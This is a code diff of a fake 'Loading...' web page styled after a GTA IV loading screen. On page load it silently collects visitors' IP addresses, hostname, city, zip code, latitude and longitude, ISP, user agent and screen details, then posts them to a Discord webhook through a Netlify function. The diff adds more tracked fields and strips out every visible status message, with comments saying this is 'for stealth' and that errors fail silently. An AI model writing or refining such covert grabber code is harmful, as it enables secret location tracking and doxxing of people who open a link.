@@ -5,22 +5,21 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Loading...</title>
   <style>
+    /* GTA IV loading screen style */
     html, body {
       margin: 0; padding: 0; height: 100%;
       background: black;
       color: white;
       font-family: 'Arial Black', Arial, sans-serif;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       user-select: none;
-      text-align: center;
-      padding: 10px;
+      overflow: hidden;
     }
     #loading-text {
-      font-size: 6rem;
-      letter-spacing: 0.3em;
+      font-size: 8rem;
+      letter-spacing: 0.6em;
       animation: flickerGTA 2.5s infinite alternate;
       user-select: none;
     }
@@ -28,29 +27,13 @@
       0%, 100% { opacity: 1; }
       40%, 60% { opacity: 0.3; }
     }
-    #log-status {
-      margin-top: 30px;
-      font-size: 1.4rem;
-      font-weight: bold;
-      color: #0f0;
-      max-width: 90vw;
-      word-wrap: break-word;
-      cursor: default;
-    }
-    #log-status.error {
-      color: #f33;
-      cursor: pointer;
-      text-decoration: underline;
-    }
   </style>
 </head>
 <body>
   <div id="loading-text">LOADING...</div>
-  <div id="log-status" title="Click to copy error message"></div>
 
   <script>
     const netlifyFunctionUrl = "/.netlify/functions/log-ip";
-    const logStatus = document.getElementById('log-status');
 
     function safeGet(obj, path, defaultValue = '') {
       return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
@@ -63,21 +46,11 @@
     }
 
     async function sendDiscordWebhook(embed) {
-      try {
-        const res = await fetch(netlifyFunctionUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ embeds: [embed] }),
-        });
-        if (!res.ok) {
-          const errorText = await res.text();
-          throw new Error(`Logging failed: ${res.status} - ${errorText}`);
-        }
-        const json = await res.json();
-        return json.message || "Logged successfully";
-      } catch (e) {
-        throw e;
-      }
+      await fetch(netlifyFunctionUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] }),
+      });
     }
 
     (async () => {
@@ -102,31 +75,35 @@
           },
           fields: [
             { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
+            { name: "IPv6 Address", value: data.ipv6 ? `\`${data.ipv6}\`` : "N/A", inline: true },
+            { name: "Hostname", value: data.hostname || "N/A", inline: true },
             { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
-            { name: "Region", value: `${data.region}`, inline: true },
-            { name: "City", value: `${data.city}`, inline: true },
-            { name: "ISP", value: `${data.isp}`, inline: false },
+            { name: "Region", value: data.region || "N/A", inline: true },
+            { name: "City", value: data.city || "N/A", inline: true },
+            { name: "Zip", value: data.postal || "N/A", inline: true },
+            { name: "Latitude", value: data.latitude || "N/A", inline: true },
+            { name: "Longitude", value: data.longitude || "N/A", inline: true },
+            { name: "ISP", value: data.isp || "N/A", inline: false },
+            { name: "Organization", value: data.org || "N/A", inline: false },
+            { name: "ASN", value: data.asn || "N/A", inline: true },
             { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
-            { name: "VPN/Proxy Detected", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
+            { name: "Currency", value: `${safeGet(data, ['currency', 'code'], 'N/A')} (${safeGet(data, ['currency', 'name'], '')})`, inline: true },
+            { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
+            { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting'], false) ? "Yes" : "No", inline: true },
+            { name: "Mobile", value: safeGet(data, ['security', 'is_mobile'], false) ? "Yes" : "No", inline: true },
+            { name: "Bot", value: safeGet(data, ['security', 'is_bot'], false) ? "Yes" : "No", inline: true },
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-            { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
+            { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true },
           ]
         };
 
-        const result = await sendDiscordWebhook(embed);
-        logStatus.textContent = `✅ Success: ${result}`;
-        logStatus.classList.remove('error');
-        logStatus.title = "";
-      } catch (err) {
-        logStatus.textContent = `❌ Error: ${err.message}\n\nTap here to copy`;
-        logStatus.classList.add('error');
-        logStatus.title = "Tap to copy error message";
+        await sendDiscordWebhook(embed);
 
-        logStatus.onclick = () => {
-          navigator.clipboard.writeText(err.message)
-            .then(() => alert("Error message copied! Send it to me."))
-            .catch(() => alert("Failed to copy error message."));
-        };
+        // No visible logs or success messages for stealth
+
+      } catch (err) {
+        // Fail silently, no visible errors
+        console.error("Logging failed:", err);
       }
     })();
   </script>
